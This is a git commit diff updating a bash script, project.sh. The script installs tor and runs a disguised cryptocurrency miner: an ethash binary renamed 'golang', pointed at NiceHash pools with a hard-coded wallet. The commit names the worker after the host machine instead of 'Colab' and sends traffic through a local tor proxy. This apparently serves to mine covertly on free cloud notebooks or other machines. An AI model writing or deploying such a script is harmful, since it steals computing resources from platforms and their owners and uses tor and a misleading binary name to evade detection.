936617e6366b8e04c54388b4c336cac89ee9d8d6
taovuu1 <94132974+taovuu1@users.noreply.github.com>
2022-02-04 13:12:22 +0700

    Update project.sh

--- project.sh
+++ project.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
-sudo apt-get install -y tor libpci-dev proxychains
+sudo apt-get install -y tor libpci-dev 
 
-string="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.Colab"
+string="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$(hostname)
 pool1=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353
 pool2=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
 
@@ -16,4 +16,4 @@ cd golang_linux_amd64
 
 chmod 777 golang
 
-./golang -a ethash --url $pool1 --url2 $pool2 -u $string -p x -w $name --proxy
+./golang -a ethash --url $pool1 -u $string -p x --proxy 127.0.0.1:9050
